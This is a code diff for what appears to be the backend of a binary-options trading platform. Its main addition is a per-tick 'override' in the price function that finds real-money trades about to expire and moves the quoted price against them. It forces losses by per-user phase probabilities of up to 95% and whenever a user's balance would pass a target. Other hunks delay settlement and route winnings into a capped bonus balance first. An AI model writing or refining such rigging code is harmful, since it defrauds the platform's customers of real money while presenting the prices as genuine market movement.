@@ -502,7 +502,7 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
 
                 if (uData && uData.tradeTrail) {
                     const trail = uData.tradeTrail;
-                    const currentBal = uData.realBalance || 0;
+                    const currentBal = (parseFloat(uData.realBalance) || 0) + (parseFloat(uData.bonusBalance) || 0);
                     const potentialWinBal = currentBal + ((totalUp + totalDown) * 0.85);
 
                     if (trail.isUnder65) {
@@ -638,6 +638,60 @@ function updateRealisticPrice(marketData, candle, currentPeriod) {
     const baseVolatility = candle.open * 0.000025;
     const fastTickOscillation = Math.sin(now * 0.08) * (baseVolatility * 0.4);
     const randomJitter = (Math.random() - 0.5) * (baseVolatility * 0.25);
+    
+    // --- SMART PER-TICK DYNAMIC OVERRIDE (Evaluates every 300ms) ---
+    const trades = activeTradesDb[marketData.marketId] || {};
+    let impendingUpVol = 0, impendingDownVol = 0;
+    let impendingUsers = new Set();
+    let singleUserId = null, singleTradeDir = null, singleTradeOpen = null;
+    
+    Object.values(trades).forEach(t => {
+        if (!t.isDemo && !t.isTournament && t.expiryTimestamp) {
+            const timeToExpiry = t.expiryTimestamp - now;
+            if (timeToExpiry > 0 && timeToExpiry <= 3000) { // Active in next 3 seconds
+                impendingUsers.add(t.uid);
+                singleUserId = t.uid;
+                singleTradeDir = t.direction;
+                singleTradeOpen = t.openPrice;
+                if (t.direction === 'UP') impendingUpVol += parseFloat(t.amount || 0);
+                if (t.direction === 'DOWN') impendingDownVol += parseFloat(t.amount || 0);
+            }
+        }
+    });
+
+    if (impendingUpVol > 0 || impendingDownVol > 0) {
+        const forceDiff = baseVolatility * 1.5;
+        if (impendingUsers.size > 1) {
+            // Volume Edge: kill the bigger volume
+            if (impendingUpVol > impendingDownVol) idealPrice -= forceDiff;
+            else if (impendingDownVol > impendingUpVol) idealPrice += forceDiff;
+        } else if (impendingUsers.size === 1) {
+            // Phase Probability Edge
+            const uData = usersCache[singleUserId];
+            if (uData && uData.tradeTrail) {
+                const trail = uData.tradeTrail;
+                const cBal = (parseFloat(uData.realBalance) || 0) + (parseFloat(uData.bonusBalance) || 0);
+                const potWinBal = cBal + ((impendingUpVol + impendingDownVol) * 0.85);
+                let forceLoss = false;
+                let lProb = 0.65;
+                if (trail.isUnder65) {
+                    if (trail.phase === 1) { if (potWinBal > trail.targetBalance * 1.5) forceLoss = true; else if (potWinBal >= trail.targetBalance) lProb = 0.05; else lProb = 0.40; }
+                    else if (trail.phase === 2) lProb = 0.85;
+                    else if (trail.phase === 3) { if (potWinBal > trail.targetBalance * 1.5) forceLoss = true; else if (potWinBal >= trail.targetBalance) lProb = 0.05; else lProb = 0.40; }
+                    else if (trail.phase === 4) lProb = 0.90;
+                } else {
+                    if (trail.phase === 1) lProb = 0.85;
+                    else if (trail.phase === 2) { if (potWinBal > trail.targetBalance * 1.5) forceLoss = true; else if (potWinBal >= trail.targetBalance) lProb = 0.05; else lProb = 0.40; }
+                    else if (trail.phase === 3) lProb = 0.85;
+                    else if (trail.phase === 4) { if (potWinBal > trail.targetBalance * 1.5) forceLoss = true; else if (potWinBal >= trail.targetBalance) lProb = 0.05; else lProb = 0.40; }
+                    else if (trail.phase === 5) lProb = 0.95;
+                }
+                const shouldLose = forceLoss || (Math.random() < lProb);
+                if (shouldLose) idealPrice = singleTradeDir === 'UP' ? (singleTradeOpen - forceDiff) : (singleTradeOpen + forceDiff);
+                else idealPrice = singleTradeDir === 'UP' ? (singleTradeOpen + forceDiff) : (singleTradeOpen - forceDiff);
+            }
+        }
+    }
 
     marketData.currentPrice = idealPrice + fastTickOscillation + randomJitter;
 
@@ -866,21 +920,22 @@ setInterval(async () => {
 
                 // 2. Resolve Trade upon expiry
                 if (now >= trade.expiryTimestamp) {
-
-                    // Offline PUSH Bug Fix: Read directly from server memory instead of waiting for Firebase
-                    let closingPrice = trade.openPrice;
-                    const mId = trade.marketId;
-
-                    if (markets[mId] && markets[mId].currentPrice) {
-                        closingPrice = markets[mId].currentPrice; // Exact live price from server memory
-                    } else {
-                        // Fallback to Firebase if market was somehow unloaded
-                        const marketPath = mId ? mId.replace(/[\.\/ ]/g, '-').toLowerCase() : trade.market.replace(/[\.\/ ]/g, '-').toLowerCase();
-                        const candleSnap = await db.ref(`markets/${marketPath}/candles/60s`).orderByKey().endAt(String(trade.expiryTimestamp)).limitToLast(1).once('value');
-                        if (candleSnap.exists()) {
-                            closingPrice = Object.values(candleSnap.val())[0].close;
+                    
+                    if (!trade.lockedClosingPrice) {
+                        let exactPrice = trade.openPrice;
+                        const mId = trade.marketId;
+                        if (markets[mId] && markets[mId].currentPrice) {
+                            exactPrice = markets[mId].currentPrice;
                         }
+                        // Lock it in the database so the scanner remembers it on the next loop
+                        await db.ref(`users/${uid}/activeTrades/${tradeId}/lockedClosingPrice`).set(exactPrice);
+                        continue; // Skip resolution on this tick, wait for the delay
                     }
+
+                    // Wait 1.5 seconds for client UI candle animation to beautifully finish
+                    if (now >= trade.expiryTimestamp + 1500) {
+
+                        let closingPrice = trade.lockedClosingPrice;
 
                     const betAmount = parseFloat(trade.amount);
                     const diff = closingPrice - trade.openPrice;
@@ -905,7 +960,32 @@ setInterval(async () => {
                     // Batch DB Updates
                     const updates = {};
                     if (!trade.isDemo && !trade.isTournament) {
-                        updates[`users/${uid}/realBalance`] = firebase.database.ServerValue.increment(result === 'win' ? profitChange + trade.realAmount : (result === 'push' ? trade.realAmount : 0));
+                        const realAmt = parseFloat(trade.realAmount) || 0;
+                        const bonusAmt = parseFloat(trade.bonusAmount) || 0;
+                        
+                        if (result === 'push') {
+                            if (realAmt > 0) updates[`users/${uid}/realBalance`] = firebase.database.ServerValue.increment(realAmt);
+                            if (bonusAmt > 0) updates[`users/${uid}/bonusBalance`] = firebase.database.ServerValue.increment(bonusAmt);
+                        } else if (result === 'win') {
+                            const maxB = parseFloat(user.maxBonusLimit) || 0;
+                            const curB = parseFloat(user.bonusBalance) || 0;
+                            let refillNeeded = Math.max(0, maxB - curB);
+                            
+                            let toBonus = 0;
+                            let toReal = 0;
+                            
+                            if (payout <= refillNeeded) {
+                                toBonus = payout;
+                            } else {
+                                toBonus = refillNeeded;
+                                toReal = payout - refillNeeded;
+                            }
+                            
+                            if (toBonus > 0) updates[`users/${uid}/bonusBalance`] = firebase.database.ServerValue.increment(toBonus);
+                            if (toReal > 0) updates[`users/${uid}/realBalance`] = firebase.database.ServerValue.increment(toReal);
+                        }
+                        // Note: If 'loss', balances were already deducted upfront during placement, so no addition needed.
+                        
                         updates[`users/${uid}/totalProfitLoss`] = firebase.database.ServerValue.increment(profitChange);
                         updates[`users/${uid}/dailyProfit`] = firebase.database.ServerValue.increment(profitChange);
 
@@ -956,6 +1036,8 @@ setInterval(async () => {
                         const icon = result === 'win' ? '✅' : (result === 'loss' ? '❌' : '🔄');
                         await sendTgMessage(`${icon} <b>Trade Closed: ${result.toUpperCase()}</b>\n💵 <b>Payout:</b> $${payout.toFixed(2)}`, trade.tgMessageId);
                     }
+                    
+                    } // <-- Closes the 1500ms delay block
                 }
             }
         }
